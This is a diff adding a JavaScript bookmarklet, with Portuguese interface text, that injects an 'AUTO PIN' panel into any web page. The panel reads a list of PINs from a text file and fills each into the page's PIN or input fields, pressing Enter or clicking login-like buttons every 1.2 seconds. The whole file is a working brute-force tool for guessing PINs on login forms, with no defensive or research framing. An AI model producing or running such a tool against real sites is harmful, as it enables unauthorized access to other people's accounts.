@@ -1,0 +1,107 @@
+javascript:(function(){
+  if(window.__pinAutoPainel){
+    alert("Já está aberto!");
+    return;
+  }
+  window.__pinAutoPainel = 1;
+
+  let p = document.createElement("div");
+  p.style = "position:fixed;top:60px;right:60px;z-index:999999;background:#23272f;color:#fff;border-radius:12px;padding:10px 12px;box-shadow:0 8px 32px #0008;min-width:280px;font-family:sans-serif;font-size:13px;border:1px solid #555;";
+  p.innerHTML = `
+    <b>AUTO PIN</b><br>
+    <input type="file" id="pinFile" accept=".txt" style="margin:4px 0;"><br>
+    <input id="pinManual" placeholder="Digite PIN" style="width:140px;margin:6px 0 4px 0;border-radius:3px;border:none;padding:4px 6px;font-size:13px;"><br>
+    <button id="pinGo" style="margin:5px 4px 0 0;padding:4px 10px;background:#28a745;border:none;border-radius:4px;color:#fff;font-weight:bold;cursor:pointer;">Iniciar</button>
+    <button id="pinStop" style="padding:4px 10px;background:#c00;border:none;border-radius:4px;color:#fff;font-weight:bold;cursor:pointer;">Parar</button>
+    <button id="pinClose" style="padding:4px 8px;background:#444;border:none;border-radius:4px;color:#fff;float:right;font-weight:bold;cursor:pointer;">×</button>
+    <div id="pinStatus" style="margin-top:7px;min-height:12px;font-size:12px;color:#ccc;">Pronto.</div>
+  `;
+  document.body.appendChild(p);
+
+  let running = false, list = [], idx = 0, status = document.getElementById("pinStatus");
+
+  function cleanP(){ try{p.remove();}catch(e){} window.__pinAutoPainel=0; }
+  document.getElementById("pinClose").onclick = cleanP;
+  document.getElementById("pinStop").onclick = function(){ running=false; status.textContent="Parado."; };
+
+  function getInputFields(){
+    let all=[...document.querySelectorAll("input,textarea")].filter(e=>{
+      let t=(e.type||"").toLowerCase();
+      return !e.disabled && !e.readOnly && e.offsetWidth>0 && e.offsetHeight>0 &&
+             !["button","submit","reset","file","hidden","image"].includes(t);
+    });
+    return all;
+  }
+
+  function pressEnter(el){
+    ["keydown","keypress","keyup"].forEach(evt=>{
+      el.dispatchEvent(new KeyboardEvent(evt,{
+        bubbles:true,cancelable:true,key:"Enter",code:"Enter",which:13,keyCode:13
+      }));
+    });
+  }
+
+  function clickLoginButton(){
+    let keys=["entrar","login","enviar","submit","continuar","ok"];
+    let clicked=false;
+    [...document.querySelectorAll("button,input")].forEach(e=>{
+      let t=((e.textContent||"")+(e.value||"")+(e.innerText||"")).toLowerCase();
+      if(keys.some(v=>t.includes(v)) && e.offsetWidth>0 && e.offsetHeight>0 && !e.disabled){
+        e.click();
+        clicked=true;
+      }
+    });
+    return clicked;
+  }
+
+  function fillPin(v){
+    let fields = getInputFields();
+    let pinFields = fields.filter(f=>f.maxLength===1 || f.size===1);
+
+    if(pinFields.length >= v.length){
+      for(let i=0;i<v.length;i++){
+        pinFields[i].focus();
+        pinFields[i].value=v[i];
+        pinFields[i].dispatchEvent(new Event("input",{bubbles:true}));
+      }
+      pinFields[v.length-1].focus();
+      pressEnter(pinFields[v.length-1]) || clickLoginButton();
+    } else if(fields[0]){
+      fields[0].focus();
+      fields[0].value=v;
+      fields[0].dispatchEvent(new Event("input",{bubbles:true}));
+      pressEnter(fields[0]) || clickLoginButton();
+    }
+  }
+
+  function next(){
+    if(!running || idx>=list.length){ status.textContent="Finalizado."; return; }
+    let v=list[idx];
+    status.textContent="Testando "+(idx+1)+"/"+list.length+" ["+v+"]";
+    fillPin(v);
+    idx++;
+    if(running) setTimeout(next, 1200); // intervalo de 1.2s
+  }
+
+  document.getElementById("pinGo").onclick = function(){
+    let manual=document.getElementById("pinManual").value.trim();
+    let file=document.getElementById("pinFile").files[0];
+
+    if(manual!==""){
+      list=[manual];
+      idx=0; running=true; status.textContent="Iniciando com PIN manual...";
+      next();
+    } else if(file){
+      let reader=new FileReader();
+      reader.onload=function(e){
+        list=e.target.result.split("\n").map(v=>v.trim()).filter(v=>v);
+        if(list.length===0){ status.textContent="Arquivo vazio."; return; }
+        idx=0; running=true; status.textContent="Iniciando com lista...";
+        next();
+      };
+      reader.readAsText(file);
+    } else {
+      status.textContent="Informe PIN manual ou selecione arquivo.";
+    }
+  };
+})();
